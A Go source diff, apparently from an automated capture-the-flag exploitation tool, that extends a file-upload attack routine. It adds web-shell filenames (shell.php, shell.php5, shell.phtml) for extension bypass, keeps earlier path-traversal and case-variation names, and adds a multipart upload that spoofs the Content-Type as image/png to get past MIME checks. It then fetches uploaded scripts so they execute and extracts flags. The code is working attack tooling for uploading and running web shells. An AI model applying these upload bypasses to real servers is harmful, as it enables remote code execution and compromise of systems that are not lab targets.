@@ -16,6 +16,7 @@ import (
 	"io"
 	"mime/multipart"
 	"net/http"
+	"net/textproto"
 	"net/url"
 	"os"
 	"regexp"
@@ -30,6 +31,7 @@ var uploadFilenamesByScene = [][]string{
 	{"sh.py", "sh.PY"},                                    // unrestricted / fallback
 	{"sh.py", "sh.PY", "sh.pyc"},                          // blacklist 大小写绕过
 	{"sh.py", "../wwwexec/sh.py", "..%2fwwwexec%2fsh.py"}, // traversal
+	{"shell.php", "shell.php5", "shell.phtml"},            // web-shell 扩展名绕过（靶机只认 .php / image/png）
 }
 
 var uploadCommonPaths = []string{"/upload", "/upload.php", "/file/upload", "/api/upload", "/uploads/upload"}
@@ -126,16 +128,43 @@ func ExploitUploadTarget(ctx context.Context, cl *http.Client, baseURL string, h
 					return out
 				default:
 				}
-				savedPath, ok := uploadMultipart(ctx, cl, upURL, name, uploadShellSrc)
-				if !ok {
-					continue
+				// 默认 MIME 投递（octet-stream）
+				savedPath, flagHit, ok := uploadMultipart(ctx, cl, upURL, name, uploadShellSrc, "")
+				if flagHit != "" && !flagSeen[flagHit] {
+					flagSeen[flagHit] = true
+					out = append(out, flagHit)
+					return out
 				}
-				// 取回执行结果：保存响应给的路径，或按扩展名场景推导
-				fetchPaths := uploadFetchCandidates(savedPath, name)
-				for _, fp := range fetchPaths {
-					if f := fetchUploadResult(ctx, cl, base, fp); f != "" && !flagSeen[f] {
-						flagSeen[f] = true
-						out = append(out, f)
+				if ok {
+					// 取回执行结果：保存响应给的路径，或按扩展名场景推导
+					fetchPaths := uploadFetchCandidates(savedPath, name)
+					for _, fp := range fetchPaths {
+						if f := fetchUploadResult(ctx, cl, base, fp); f != "" && !flagSeen[f] {
+							flagSeen[f] = true
+							out = append(out, f)
+						}
+					}
+					if len(out) > 0 {
+						return out
+					}
+				}
+				// MIME 绕过：显式 image/png（靶机只认 Content-Type==image/png 或 .php 扩展名）
+				_, flagHit2, ok2 := uploadMultipart(ctx, cl, upURL, name, uploadShellSrc, "image/png")
+				if flagHit2 != "" && !flagSeen[flagHit2] {
+					flagSeen[flagHit2] = true
+					out = append(out, flagHit2)
+					return out
+				}
+				if ok2 {
+					fetchPaths := uploadFetchCandidates(name, name)
+					for _, fp := range fetchPaths {
+						if f := fetchUploadResult(ctx, cl, base, fp); f != "" && !flagSeen[f] {
+							flagSeen[f] = true
+							out = append(out, f)
+						}
+					}
+					if len(out) > 0 {
+						return out
 					}
 				}
 			}
@@ -147,43 +176,59 @@ func ExploitUploadTarget(ctx context.Context, cl *http.Client, baseURL string, h
 	return out
 }
 
-// uploadMultipart 以 multipart/form-data 上传脚本，返回 (保存提示中的路径/文件名, 是否被接受)。
-func uploadMultipart(ctx context.Context, cl *http.Client, upURL, name, src string) (string, bool) {
+// uploadMultipart 以 multipart/form-data 上传脚本。
+// contentType 非空时显式设置 part 的 Content-Type（用于绕过只信 MIME 的靶机，如 image/png）；
+// 否则用默认 application/octet-stream。
+// 返回：(保存提示中的路径, 上传响应体里直接抽到的 flag, 是否被接受)。
+func uploadMultipart(ctx context.Context, cl *http.Client, upURL, name, src, contentType string) (string, string, bool) {
 	if cl == nil {
 		cl = webClient(8 * time.Second)
 	}
 	var buf bytes.Buffer
 	mw := multipart.NewWriter(&buf)
-	fw, err := mw.CreateFormFile("file", name)
+	var fw io.Writer
+	var err error
+	if contentType != "" {
+		fw, err = mw.CreatePart(textproto.MIMEHeader{
+			"Content-Disposition": {`form-data; name="file"; filename="` + name + `"`},
+			"Content-Type":        {contentType},
+		})
+	} else {
+		fw, err = mw.CreateFormFile("file", name)
+	}
 	if err != nil {
-		return "", false
+		return "", "", false
 	}
 	if _, err := io.Copy(fw, strings.NewReader(src)); err != nil {
-		return "", false
+		return "", "", false
 	}
 	if err := mw.Close(); err != nil {
-		return "", false
+		return "", "", false
 	}
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, upURL, &buf)
 	if err != nil {
-		return "", false
+		return "", "", false
 	}
 	req.Header.Set("Content-Type", mw.FormDataContentType())
 	resp, err := cl.Do(req)
 	if err != nil {
-		return "", false
+		return "", "", false
 	}
 	defer resp.Body.Close()
 	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
 	text := string(body)
 	if resp.StatusCode >= 400 {
-		return "", false
+		return "", "", false
 	}
 	// 从保存响应提取路径（saved as ../wwwexec/sh.py / saved as sh.PY 等）
 	if m := reUploadSaved.FindStringSubmatch(text); m != nil {
-		return m[1], true
+		return m[1], "", true
 	}
-	return name, true
+	// 部分靶机「接受即回显 flag」在上传响应体里（不落盘执行）——直接抽。
+	if f := firstCleanFlag(flagRegexPresolve.FindAllString(text, -1)); f != "" {
+		return name, f, true
+	}
+	return name, "", true
 }
 
 var reUploadSaved = regexp.MustCompile(`(?i)saved as\s+(\S+)`)
